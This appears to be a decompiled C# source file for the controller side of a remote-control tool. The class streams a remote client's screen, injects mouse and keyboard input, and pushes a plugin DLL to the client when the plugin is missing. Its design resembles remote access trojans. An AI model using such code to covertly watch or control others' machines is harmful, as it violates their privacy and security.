

using InvokedCommon.Enums;
using InvokedCommon.Messages;
using InvokedCommon.Networking;
using InvokedCommon.Video.Codecs;
using InvokedServer.Enums;
using InvokedServer.Helper;
using System;
using System.Drawing;
using System.IO;
using System.Threading;


namespace InvokedServer.Messages
{
	public class RemoteDesktopHandler : MessageProcessorBase<Bitmap>, IDisposable
	{
		private string _pluginPath = "Plugins\\PluginRemoteDesktop.dll";
		private string _pluginName = "RemoteDesktop";
		private readonly object _syncLock = new object();
		private readonly object _sizeLock = new object();
		private Size _localResolution;
		public bool _enableOldGraphicsEngine;
		private readonly InvokedServer.Networking.Client _client;
		private UnsafeStreamCodec _codec;

		public event RemoteDesktopHandler.PluginStatusEventHandler PluginStatusChanged;

		private void OnPluginStatusChanged(PluginStatus value)
		{
			this.SynchronizationContext.Post((SendOrPostCallback)(val =>
			{
				RemoteDesktopHandler.PluginStatusEventHandler pluginStatusChanged = this.PluginStatusChanged;
				if (pluginStatusChanged == null)
					return;
				pluginStatusChanged((object)this, (PluginStatus)val);
			}), (object)value);
		}

		public event RemoteDesktopHandler.MessegeSizeHandler NewImageSizeUpdate;

		private void OnNewImageSizeUpdate(string text)
		{
			this.SynchronizationContext.Post((SendOrPostCallback)(val =>
			{
				RemoteDesktopHandler.MessegeSizeHandler newImageSizeUpdate = this.NewImageSizeUpdate;
				if (newImageSizeUpdate == null)
					return;
				newImageSizeUpdate((object)this, (string)val);
			}), (object)text);
		}

		public bool IsStarted { get; set; }

		public Size LocalResolution
		{
			get
			{
				lock (this._sizeLock)
					return this._localResolution;
			}
			set
			{
				lock (this._sizeLock)
					this._localResolution = value;
			}
		}

		public event RemoteDesktopHandler.DisplaysChangedEventHandler DisplaysChanged;

		private void OnDisplaysChanged(int value)
		{
			this.SynchronizationContext.Post((SendOrPostCallback)(val =>
			{
				RemoteDesktopHandler.DisplaysChangedEventHandler displaysChanged = this.DisplaysChanged;
				if (displaysChanged == null)
					return;
				displaysChanged((object)this, (int)val);
			}), (object)value);
		}

		public RemoteDesktopHandler(InvokedServer.Networking.Client client)
		  : base(true)
		{
			this._client = client;
		}

		public override bool CanExecute(IMessage message)
		{
			switch (message)
			{
				case GetDesktopResponse _:
				case GetMonitorsResponse _:
				case SetRDStatus _:
					return true;
				default:
					return message is CheckPluginResponse | message is GetDesktopResponseOldGfxEng;
			}
		}

		public override bool CanExecuteFrom(ISender sender) => this._client.Equals((object)sender);

		public override void Execute(ISender sender, IMessage message)
		{
			switch (message)
			{
				case GetDesktopResponse message1:
					this.Execute(sender, message1);
					break;
				case GetMonitorsResponse message2:
					this.Execute(sender, message2);
					break;
				case SetRDStatus message3:
					this.Execute(sender, message3);
					break;
				case CheckPluginResponse message4:
					this.Execute(sender, message4);
					break;
				case GetDesktopResponseOldGfxEng message5:
					this.Execute(sender, message5);
					break;
			}
		}

		public void CheckPluginStatus()
		{
			this._client.Send<CheckPlugin>(new CheckPlugin()
			{
				PluginName = this._pluginName
			});
		}

		public void BeginReceiveFrames(int quality, int display, bool showcursor)
		{
			lock (this._syncLock)
			{
				this.IsStarted = true;
				this._codec?.Dispose();
				this._codec = (UnsafeStreamCodec)null;
				if (this._enableOldGraphicsEngine)
					this._client.Send<GetDesktopOldGfxEng>(new GetDesktopOldGfxEng()
					{
						CreateNew = true,
						Quality = quality,
						DisplayIndex = display,
						ShowCursor = showcursor
					});
				else
					this._client.Send<GetDesktop>(new GetDesktop()
					{
						RDStatus = RemoteDesktopStatus.Start,
						Quality = quality,
						DisplayIndex = display,
						ShowCursor = showcursor
					});
			}
		}

		public void SetOldGraphicsEngine(bool enable) => this._enableOldGraphicsEngine = enable;

		public void EndReceiveFrames()
		{
			lock (this._syncLock)
			{
				this.IsStarted = false;
				this._client.Send<GetDesktop>(new GetDesktop()
				{
					RDStatus = RemoteDesktopStatus.Stop,
					Quality = 0,
					DisplayIndex = 0,
					ShowCursor = true
				});
			}
		}

		public void RefreshDisplays() => this._client.Send<GetMonitors>(new GetMonitors());

		public void SendMouseEvent(
		  MouseAction mouseAction,
		  bool isMouseDown,
		  int x,
		  int y,
		  int displayIndex)
		{
			lock (this._syncLock)
				this._client.Send<DoMouseEvent>(new DoMouseEvent()
				{
					Action = mouseAction,
					IsMouseDown = isMouseDown,
					X = x * this._codec.Resolution.Width / this.LocalResolution.Width,
					Y = y * this._codec.Resolution.Height / this.LocalResolution.Height,
					MonitorIndex = displayIndex
				});
		}

		public void SendKeyboardEvent(byte keyCode, bool keyDown)
		{
			this._client.Send<DoKeyboardEvent>(new DoKeyboardEvent()
			{
				Key = keyCode,
				KeyDown = keyDown
			});
		}

		private void Execute(ISender client, CheckPluginResponse message)
		{
			if (message.PluginName != this._pluginName)
				return;
			if (message.Status)
			{
				this.OnPluginStatusChanged(PluginStatus.Loaded);
				this.RefreshDisplays();
			}
			else
			{
				this.OnPluginStatusChanged(PluginStatus.Installing);
				if (File.Exists(this._pluginPath))
					this._client.Send<DoPlugin>(new DoPlugin()
					{
						PluginName = this._pluginName,
						Data = Zip.Compress(File.ReadAllBytes(this._pluginPath))
					});
				else
					this.OnPluginStatusChanged(PluginStatus.PluginFileNotFound);
			}
		}

		private void Execute(ISender client, SetRDStatus message)
		{
			if (message.Status == RemoteDesktopStatus.CheckServer)
			{
				client.Send<SetRDStatus>(new SetRDStatus()
				{
					Status = RemoteDesktopStatus.ResetClientFrameCount
				});
			}
			else
			{
				if (message.Status != RemoteDesktopStatus.Stopped)
					return;
				this._enableOldGraphicsEngine = false;
			}
		}

		private void Execute(ISender client, GetDesktopResponseOldGfxEng message)
		{
			if (!this.IsStarted || message == null || message.Image == null)
				return;
			lock (this._syncLock)
			{
				if (this._codec == null || this._codec.ImageQuality != message.Quality || this._codec.Monitor != message.Monitor || this._codec.Resolution != message.Resolution)
				{
					this._codec?.Dispose();
					this._codec = new UnsafeStreamCodec(message.Quality, message.Monitor, message.Resolution);
				}
				try
				{
					using (MemoryStream inStream = new MemoryStream(message.Image))
						this.OnReport(new Bitmap((Image)this._codec.DecodeData((Stream)inStream), this.LocalResolution));
				}
				catch
				{
				}
				double num1 = (double)message.Image.Length / 1024.0;
				double num2 = num1 / 1024.0;
				this.OnNewImageSizeUpdate(num2 < 1.0 ? string.Format("{0:F2} KB", (object)num1) : string.Format("{0:F2} MB", (object)num2));
				client.Send<GetDesktopOldGfxEng>(new GetDesktopOldGfxEng()
				{
					CreateNew = false,
					Quality = message.Quality,
					DisplayIndex = message.Monitor,
					ShowCursor = true
				});
			}
		}

		private void Execute(ISender client, GetDesktopResponse message)
		{
			if (!this.IsStarted || message == null || message.Image == null)
				return;
			lock (this._syncLock)
			{
				if (this._codec == null || this._codec.ImageQuality != message.Quality || this._codec.Monitor != message.Monitor || this._codec.Resolution != message.Resolution)
				{
					this._codec?.Dispose();
					this._codec = new UnsafeStreamCodec(message.Quality, message.Monitor, message.Resolution);
				}
				try
				{
					using (MemoryStream inStream = new MemoryStream(message.Image))
						this.OnReport(new Bitmap((Image)this._codec.DecodeData((Stream)inStream), this.LocalResolution));
				}
				catch
				{
				}
				double num1 = (double)message.Image.Length / 1024.0;
				double num2 = num1 / 1024.0;
				this.OnNewImageSizeUpdate(num2 < 1.0 ? string.Format("{0:F2} KB", (object)num1) : string.Format("{0:F2} MB", (object)num2));
			}
		}

		private void Execute(ISender client, GetMonitorsResponse message)
		{
			this.OnDisplaysChanged(message.Number);
		}

		public void Dispose()
		{
			this.Dispose(true);
			GC.SuppressFinalize((object)this);
		}

		protected virtual void Dispose(bool disposing)
		{
			if (!disposing)
				return;
			lock (this._syncLock)
			{
				this.IsStarted = false;
				this._codec?.Dispose();
			}
		}

		public delegate void PluginStatusEventHandler(object sender, PluginStatus value);

		public delegate void MessegeSizeHandler(object sender, string text);

		public delegate void DisplaysChangedEventHandler(object sender, int value);
	}
}